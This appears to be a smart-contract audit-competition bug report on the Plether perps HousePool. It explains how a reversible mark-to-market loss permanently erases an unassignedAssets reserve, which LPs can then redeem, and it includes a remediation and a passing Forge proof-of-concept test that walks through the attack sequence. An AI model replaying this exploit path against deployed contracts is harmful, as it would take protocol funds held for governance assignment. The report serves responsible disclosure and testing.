# \#97848 [SC-Medium] Temporary deficits transfer unassigned assets to LPs

**Submitted on Nov 3rd 2026 at 14:52:30 UTC by @TaiChi_Audit_Group for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97848
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary
A mark-to-market drawdown permanently truncates `unassignedAssets` to current distributable equity. If the marked liability later reverses without any pool cash movement, the erased amount is treated as new Senior/Junior revenue, allowing existing LPs to capture assets that were quarantined for explicit governance assignment.

## Description
`unassignedAssets` records canonical pool value that has no valid share-owner path, such as recapitalization supplied beyond Senior's restoration requirement. It is excluded from tranche NAV and blocks ordinary LP entry until governance explicitly assigns it.

During reconciliation, however, the planner first caps the stored unassigned balance to the current terminal distributable amount. The difference is discarded rather than recorded as an impaired unassigned claim or recovery target ([src/libraries/HousePoolReconcilePlanLib.sol:68-85](src/libraries/HousePoolReconcilePlanLib.sol:68-85)):

```solidity
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;

uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;
```

`HousePool._reconcile()` persists this truncated balance even when the reduction comes only from the Engine's reversible terminal price delta and no settlement token has left the pool ([src/HousePool.sol:1555-1598](src/HousePool.sol:1555-1598)). Once the mark or other temporary liability recovers, the old unassigned amount no longer exists in storage. The recovery path therefore regards all equity above the reduced balance as claimant revenue: it restores Senior to its high-water mark and then credits Junior, rather than restoring the erased unassigned reserve ([src/libraries/HousePoolPendingPreviewLib.sol:150-187](src/libraries/HousePoolPendingPreviewLib.sol:150-187)).

This creates path-dependent ownership. An LP can keep a small redemption epoch matured and permissionlessly force the loss-state reconciliation at a favorable oracle tick. When tranche principal is wiped, the zero-value redemption is refunded but still supplies settlement progress, so the attacker retains their shares. After the marked liability reverses, another epoch reconciliation assigns the erased unassigned value to the surviving share supply. A dominant Junior LP can then redeem most of that windfall.

The owner need not act maliciously: an honest recapitalization can leave surplus value in `unassignedAssets`, for example when the exact Senior impairment shrinks between funding and allocation. The attacker exploits only public LP settlement and valid oracle states before governance assigns the quarantined value. This is not the existing repeated-capped-recapitalization finding, whose root cause is replacement of Senior's recovery watermark by a shrinking pending bucket; here a single reconciliation destroys the independent unassigned-asset entitlement.

The closest prior findings are Cecuro `MED-12` (mixed recapitalization and revenue stranded value in `unassignedAssets`) and `LOW-65` (owner assignment could choose the Junior seed receiver). Neither covers this root: a reversible terminal mark permanently reduces an already-created unassigned bucket, after which permissionless reconciliation converts the erased governance-controlled amount into ordinary tranche principal. The architecture map explicitly says unassigned assets require explicit assignment and cannot silently become an LP windfall.

## Impact Severity

**Medium**

The issue lets an unprivileged LP destroy a governance-controlled reserve and convert the recovered value into redeemable LP principal without the required assignment. This causes direct, potentially substantial financial damage to the protocol's quarantined assets and matches the competition's Medium-severity griefing impact.

## Why This Is Valid and Not a Known Issue

This is an in-scope, permissionless violation of the documented unassigned-asset invariant: a reversible mark-to-market loss with no pool-cash movement permanently truncates an existing `unassignedAssets` balance, and the subsequent recovery reallocates exactly the erased amount to LP principal without governance assignment. The owner performs only documented recapitalization, while the attacker uses public trading, LP settlement, share transfer, and redemption paths. The root is distinct from `MED-12`, which strands mixed pending inflows in `unassignedAssets`, and `LOW-65`, which concerns the receiver chosen during owner-directed assignment; here an already-created reserve is destroyed and silently converted into an LP windfall, as the PoC demonstrates through a final USDG redemption.

## Remediation

Preserve an unassigned recovery entitlement independently of its currently backed amount. For example, retain an `unassignedRecoveryTargetAssets` or explicit eroded-unassigned balance when distributable equity falls below `unassignedAssets`, and restore that gap before routing recovered equity to Senior or Junior.

If `unassignedAssets` remains the recovery target, use `min(unassignedAssets, currentDistributable)` only as the effective current reserve; do not overwrite the stored target. Block assignment while the target is impaired, or explicitly transfer the residual entitlement to the assignment receiver. Add an adverse-mark/recovery regression that asserts the original unassigned amount never becomes tranche principal without assignment.

## Proof of Concept

The following inline test passed on the pinned commit with Forge 1.5.1. It uses honest owner recapitalization, public Router orders and LP settlement, a reversible mark with no pool-cash loss, zero-value share acquisition by a fresh attacker, and final USDG redemption. No in-scope contract is mocked or modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolTestBase} from "../perps/shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

contract UnassignedRecoveryCapturePoC is HousePoolTestBase {
    address constant TRADER = address(0xA11CE);
    address constant ATTACKER = address(0xBAD);
    address constant KEEPER = address(0xB0B0);

    function test_PoC_ReversibleMarkTransfersUnassignedRecovery() public {
        _fundSenior(alice, 100_000e6);
        _fundJunior(bob, 100_000e6);

        uint256 ownerlessAssets = 50_000e6;
        settlementToken.mint(address(this), ownerlessAssets);
        settlementToken.approve(address(engine), ownerlessAssets);
        engine.recapitalizePool(ownerlessAssets);

        // A normal funded redemption supplies progress and persists the surplus
        // recapitalization as unassigned assets.
        _finishAsyncCooldown(juniorVault, bob);
        _redeemAsync(juniorVault, bob, juniorVault.balanceOf(bob) / 1000, true);
        assertEq(pool.unassignedAssets(), ownerlessAssets);

        _fundTrader(TRADER, 10_000e6);
        uint256 size = 220_000e18;
        _trade(TRADER, CfdTypes.Side.LONG, size, 5000e6, 1e8, false);

        _finishAsyncCooldown(juniorVault, bob);
        uint256 wipedShares = juniorVault.balanceOf(bob);
        uint256 lossEpoch = _requestAsyncRedeem(juniorVault, bob, wipedShares);
        vm.warp(pool.lpEpochStart(lossEpoch));
        router.settleLpEpoch(_mockPythUpdateData(1e6));

        uint256 truncated = pool.unassignedAssets();
        uint256 erased = ownerlessAssets - truncated;
        assertGt(erased, 0);
        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(juniorVault.refundableRedeemRequest(lossEpoch, bob), wipedShares);
        vm.prank(bob);
        juniorVault.claimRedeemRefund(lossEpoch, bob, bob);

        // The Junior shares now have zero NAV and can be acquired without
        // inheriting the prior LP's economic loss.
        _finishAsyncCooldown(juniorVault, bob);
        vm.prank(bob);
        juniorVault.transfer(ATTACKER, wipedShares);

        // Reversing and closing at entry removes the temporary PnL and releases
        // the open-liability withdrawal reserve without returning pool cash.
        _trade(TRADER, CfdTypes.Side.LONG, size, 0, 1e8, true);

        _finishAsyncCooldown(juniorVault, ATTACKER);
        uint256 recoveryEpoch = _requestAsyncRedeem(juniorVault, ATTACKER, wipedShares);
        vm.warp(pool.lpEpochStart(recoveryEpoch));
        _refreshMarkForAsyncSettlement();

        (uint256 nextSenior, uint256 nextJunior,,) = pool.getPendingTrancheState();
        uint256 correctClaimants = pool.totalAssets() - ownerlessAssets;
        uint256 correctSenior = pool.seniorHighWaterMark() < correctClaimants
            ? pool.seniorHighWaterMark()
            : correctClaimants;
        uint256 correctJunior = correctClaimants - correctSenior;
        assertEq(nextSenior, correctSenior);
        assertApproxEqAbs(nextJunior - correctJunior, erased, 2);

        pool.settleLpEpoch(0, 0);
        uint256 fundedShares = juniorVault.claimableRedeemRequest(recoveryEpoch, ATTACKER);
        uint256 payout = juniorVault.claimableRedeemAssets(recoveryEpoch, ATTACKER);
        assertGt(payout, correctJunior + (erased * 9) / 10);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(recoveryEpoch, fundedShares, ATTACKER, ATTACKER);
        assertEq(settlementToken.balanceOf(ATTACKER), payout);
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool close
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, close);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }
}
```

### Run Command

Temporarily save the Solidity block as `test/poc/TMUnassignedRecovery.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/poc/TMUnassignedRecovery.t.sol -vv
```

### Verified Output

```text
[PASS] test_PoC_ReversibleMarkTransfersUnassignedRecovery() (gas: 7928220)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```
